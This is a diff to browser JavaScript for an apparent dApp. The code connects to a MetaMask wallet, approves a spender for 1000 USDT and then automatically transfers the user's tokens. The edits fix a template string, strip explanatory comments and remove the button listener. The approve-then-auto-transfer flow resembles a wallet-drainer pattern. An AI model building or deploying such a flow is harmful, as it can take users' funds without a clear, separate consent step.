@@ -15,7 +15,7 @@ async function connectWallet() {
         // Step 1: Connect to the user's wallet
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         const account = accounts[0];
-        console.log(Connected to MetaMask account: ${account});
+        console.log(`Connected to MetaMask account: ${account}`);
         
         // Step 2: Notify user about dApp's permission request
         alert("You're granting permission to the dApp to manage your wallet and transfer tokens.");
@@ -35,7 +35,6 @@ async function approveTokens(account) {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
 
-    // ERC-20 Token Contract
     const tokenContract = new ethers.Contract(
         tokenAddress,
         [
@@ -48,7 +47,6 @@ async function approveTokens(account) {
     try {
         const amountToApprove = ethers.utils.parseUnits("1000", 6); // Approve 1000 USDT tokens
 
-        // Approve the dApp to transfer tokens on behalf of the user
         const tx = await tokenContract.approve(spenderAddress, amountToApprove);
         console.log("Approval transaction sent:", tx.hash);
         document.getElementById("status").textContent = "Approval sent! Tx Hash: " + tx.hash;
@@ -56,11 +54,9 @@ async function approveTokens(account) {
         await tx.wait();
         console.log("Approval confirmed:", tx.hash);
         
-        // Check the allowance to confirm it's set
         const allowance = await tokenContract.allowance(account, spenderAddress);
         console.log("Allowance granted:", ethers.utils.formatUnits(allowance, 6), "USDT");
         
-        // Automatically proceed to transfer tokens
         if (allowance.gte(amountToApprove)) {
             await sendTokens(account);
         }
@@ -97,6 +93,3 @@ async function sendTokens(account) {
         document.getElementById("status").textContent = "Transaction failed: " + error.message;
     }
 }
-
-// Attach the event listener to the button
-document.getElementById("connectButton").addEventListener("click", connectWallet);   
